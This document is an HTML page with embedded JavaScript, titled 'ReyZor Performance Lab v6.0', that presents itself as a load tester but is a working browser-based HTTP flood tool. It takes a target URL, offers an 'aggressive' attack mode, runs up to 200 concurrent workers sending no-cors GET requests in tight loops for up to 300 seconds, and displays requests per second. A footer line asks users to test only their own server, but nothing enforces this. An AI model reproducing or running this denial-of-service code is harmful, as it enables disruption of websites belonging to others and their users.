<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ReyZor | Performance Lab v6.0</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Courier New', monospace;
            min-height: 100vh;
            color: #00ff9d;
            padding: 10px;
            font-size: 14px;
        }
        /* NO canvas background untuk mobile performance */
        .container { max-width: 600px; margin: 0 auto; }
        .header, .control-panel, .stats-panel, .console {
            background: rgba(10, 15, 25, 0.95);
            border: 1px solid #00ff9d;
            border-radius: 12px;
            margin-bottom: 12px;
            overflow: hidden;
        }
        .header { padding: 15px; text-align: center; }
        .glitch { font-size: 20px; font-weight: 800; letter-spacing: -0.5px; }
        .sub { color: #6c757d; font-size: 10px; margin-top: 4px; }
        .control-panel { padding: 15px; }
        .input-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 15px; }
        .input-field { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
        .input-field label { font-size: 12px; min-width: 80px; color: #00ff9d; }
        .input-field input, .input-field select {
            background: #0a0a0f; border: 1px solid #2a2a3a; color: #fff;
            padding: 10px 12px; border-radius: 8px; font-family: monospace; font-size: 14px;
            flex: 1; min-width: 150px;
        }
        .button-grid { display: flex; gap: 10px; flex-wrap: wrap; margin: 15px 0 0; }
        .btn { padding: 10px 16px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 13px; flex: 1; min-width: 100px; }
        .btn-primary { background: #00ff9d; color: #0a0a0f; }
        .btn-danger { background: #ff3366; color: #fff; }
        .btn-secondary { background: #2a2a3a; color: #fff; }
        .stats-panel { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 15px; }
        .stat-card { text-align: center; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 8px; }
        .stat-value { font-size: 24px; font-weight: 800; color: #00ff9d; }
        .stat-label { font-size: 10px; color: #6c757d; }
        .console { height: 180px; overflow-y: auto; padding: 10px; font-size: 10px; font-family: monospace; }
        .log-line { padding: 4px 0; border-bottom: 1px solid #1a1a2a; color: #8a8d98; word-break: break-all; }
        .log-success { color: #00ff9d; }
        .log-error { color: #ff3366; }
        .log-warning { color: #ffaa33; }
        .footer { text-align: center; padding: 12px; font-size: 9px; color: #555; }
        @media (max-width: 480px) {
            .stat-value { font-size: 18px; }
            .btn { padding: 8px 12px; font-size: 11px; }
            .input-field { flex-direction: column; align-items: stretch; }
            .input-field label { min-width: auto; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="glitch">REYZOR // PERF LAB v6.0</div>
        <div class="sub">Mobile Optimized | Real-time Timer | Low CPU Usage</div>
    </div>
    <div class="control-panel">
        <div class="input-group">
            <div class="input-field"><label>🎯 TARGET</label><input type="text" id="targetUrl" placeholder="http://target.com"></div>
            <div class="input-field"><label>⚡ MODE</label><select id="attackMode">
                <option value="simple">SIMPLE (Low CPU)</option>
                <option value="aggressive" selected>AGGRESSIVE (Max Power)</option>
            </select></div>
            <div class="input-field"><label>🧵 WORKERS</label><input type="range" id="workerSlider" min="10" max="200" value="50" style="flex:2"><span id="workerVal" style="min-width:40px">50</span></div>
            <div class="input-field"><label>⏱️ DURATION (s)</label><input type="range" id="durationSlider" min="5" max="300" value="60" style="flex:2"><span id="durationVal" style="min-width:40px">60</span></div>
        </div>
        <div class="button-grid">
            <button class="btn btn-primary" id="runBtn">▶ START</button>
            <button class="btn btn-danger" id="stopBtn">⏹️ STOP</button>
            <button class="btn btn-secondary" id="resetBtn">🔄 RESET</button>
        </div>
    </div>
    <div class="stats-panel">
        <div class="stat-card"><div class="stat-value" id="totalReq">0</div><div class="stat-label">REQUESTS</div></div>
        <div class="stat-card"><div class="stat-value" id="reqSec">0</div><div class="stat-label">RPS</div></div>
        <div class="stat-card"><div class="stat-value" id="successCount">0</div><div class="stat-label">SUCCESS</div></div>
        <div class="stat-card"><div class="stat-value" id="errorCount">0</div><div class="stat-label">ERRORS</div></div>
        <div class="stat-card"><div class="stat-value" id="timeRemain">0</div><div class="stat-label">TIME LEFT</div></div>
        <div class="stat-card"><div class="stat-value" id="statusDot">●</div><div class="stat-label">STATUS</div></div>
    </div>
    <div class="console" id="consoleLog">
        <div class="log-line log-success">[REYZOR] v6.0 Mobile Optimized ready</div>
        <div class="log-line log-success">[REYZOR] Low CPU mode active</div>
    </div>
    <div class="footer"><p>ReyZor Performance Lab | Test on your own server only</p></div>
</div>

<script>
// ========== NO CANVAS BACKGROUND ==========
// ========== MOBILE FRIENDLY ==========
// ========== REAL TIMER ==========

let active = false;
let totalRequests = 0, successReqs = 0, errorReqs = 0;
let startTime = 0, durationSec = 60, intensity = 1;
let rpsHistory = [];
let timerInterval = null;
let currentTarget = '';
let activeXHR = 0;
let maxWorkers = 50;
let currentMode = 'aggressive';

// DOM
const dom = {
    target: document.getElementById('targetUrl'),
    mode: document.getElementById('attackMode'),
    workerSlider: document.getElementById('workerSlider'),
    workerVal: document.getElementById('workerVal'),
    durationSlider: document.getElementById('durationSlider'),
    durationVal: document.getElementById('durationVal'),
    total: document.getElementById('totalReq'),
    reqSec: document.getElementById('reqSec'),
    success: document.getElementById('successCount'),
    error: document.getElementById('errorCount'),
    timeRemain: document.getElementById('timeRemain'),
    statusDot: document.getElementById('statusDot'),
    console: document.getElementById('consoleLog'),
    runBtn: document.getElementById('runBtn'),
    stopBtn: document.getElementById('stopBtn'),
    resetBtn: document.getElementById('resetBtn')
};

// Sliders update
dom.workerSlider.oninput = () => { dom.workerVal.innerText = dom.workerSlider.value; maxWorkers = parseInt(dom.workerSlider.value); };
dom.durationSlider.oninput = () => { dom.durationVal.innerText = dom.durationSlider.value; durationSec = parseInt(dom.durationSlider.value); };

function log(msg, type='success'){
    const div = document.createElement('div');
    div.className = `log-line log-${type}`;
    div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
    dom.console.appendChild(div);
    dom.console.scrollTop = dom.console.scrollHeight;
    while(dom.console.children.length > 100) dom.console.removeChild(dom.console.firstChild);
}

function updateStats(){
    dom.total.innerText = totalRequests.toLocaleString();
    dom.success.innerText = successReqs.toLocaleString();
    dom.error.innerText = errorReqs.toLocaleString();
    const now = Date.now();
    rpsHistory = rpsHistory.filter(t => now - t < 1000);
    dom.reqSec.innerText = rpsHistory.length;
    dom.statusDot.style.color = active ? '#00ff9d' : '#ff3366';
    if(active && startTime > 0){
        const elapsed = (Date.now() - startTime) / 1000;
        const left = Math.max(0, Math.ceil(durationSec - elapsed));
        dom.timeRemain.innerText = left;
    } else { dom.timeRemain.innerText = 0; }
}

function record(success){
    totalRequests++;
    rpsHistory.push(Date.now());
    if(success) successReqs++;
    else errorReqs++;
    updateStats();
}

// ========== SINGLE REQUEST (Optimized, tidak membebani HP) ==========
async function sendRequest(target){
    if(!active) return false;
    try {
        await fetch(target, { 
            method: 'GET', 
            mode: 'no-cors', 
            cache: 'no-store',
            headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*' }
        });
        record(true);
        return true;
    } catch(e){ 
        record(false); 
        return false; 
    }
}

// ========== WORKER LOOP (With adaptive delay, tidak overload HP) ==========
async function workerLoop(id){
    while(active){
        const start = Date.now();
        await sendRequest(currentTarget);
        const elapsed = Date.now() - start;
        // Adaptive delay: jangan terlalu memaksa HP sendiri
        let delay = Math.max(0, 20 - elapsed);
        if(delay > 0) await new Promise(r => setTimeout(r, delay));
    }
}

// ========== AGGRESSIVE WORKER (lebih cepat) ==========
async function aggressiveWorker(id){
    while(active){
        for(let i=0; i<3; i++){
            if(!active) break;
            sendRequest(currentTarget);
            await new Promise(r => setTimeout(r, 1));
        }
        await new Promise(r => setTimeout(r, 5));
    }
}

// ========== START TEST ==========
async function startTest(){
    if(active){ log('Test already running! Stop first.', 'error'); return; }
    
    let target = dom.target.value.trim();
    if(!target){ log('Enter target URL!', 'error'); return; }
    if(!target.startsWith('http')) target = 'https://' + target;
    
    currentTarget = target;
    currentMode = dom.mode.value;
    maxWorkers = parseInt(dom.workerSlider.value);
    durationSec = parseInt(dom.durationSlider.value);
    
    log(`══════════════════════════`, 'success');
    log(`🚀 TEST STARTED`, 'success');
    log(`📍 ${target.substring(0,50)}`, 'success');
    log(`⚡ Mode: ${currentMode} | Workers: ${maxWorkers}`, 'success');
    log(`⏱️ Duration: ${durationSec}s`, 'success');
    
    active = true;
    startTime = Date.now();
    totalRequests = 0; successReqs = 0; errorReqs = 0;
    rpsHistory = [];
    
    // Start workers based on mode
    const workerFunc = currentMode === 'aggressive' ? aggressiveWorker : workerLoop;
    for(let i=0; i<maxWorkers; i++){
        workerFunc(i);
        // Stagger start to avoid lag on phone
        await new Promise(r => setTimeout(r, 10));
    }
    
    log(`✅ ${maxWorkers} workers deployed`, 'success');
    
    // Real-time timer update (every 100ms for smooth display)
    if(timerInterval) clearInterval(timerInterval);
    timerInterval = setInterval(() => {
        if(!active){
            if(timerInterval) clearInterval(timerInterval);
            return;
        }
        const elapsed = (Date.now() - startTime) / 1000;
        if(elapsed >= durationSec){
            // Auto stop when duration ends
            clearInterval(timerInterval);
            stopTest();
            const rate = totalRequests > 0 ? ((successReqs/totalRequests)*100).toFixed(1) : 0;
            log(`══════════════════════════`, 'success');
            log(`📊 TEST COMPLETED`, 'success');
            log(`📊 Total: ${totalRequests} | Rate: ${rate}%`, 'success');
            log(`📊 Success: ${successReqs} | Errors: ${errorReqs}`, 'success');
        }
        updateStats();
    }, 100);
}

function stopTest(){
    if(!active){ log('No active test!', 'error'); return; }
    active = false;
    if(timerInterval) clearInterval(timerInterval);
    timerInterval = null;
    log(`🛑 TEST STOPPED - Total: ${totalRequests} requests`, 'error');
    updateStats();
}

function resetStats(){
    if(active) stopTest();
    totalRequests = 0; successReqs = 0; errorReqs = 0;
    rpsHistory = [];
    updateStats();
    log('📊 Statistics reset', 'success');
}

// Event bindings
dom.runBtn.addEventListener('click', startTest);
dom.stopBtn.addEventListener('click', stopTest);
dom.resetBtn.addEventListener('click', resetStats);

log('[REYZOR] v6.0 READY', 'success');
log('[REYZOR] Mobile optimized - Low CPU usage', 'success');
log('[REYZOR] Real-time timer active', 'success');
</script>
</body>
</html>
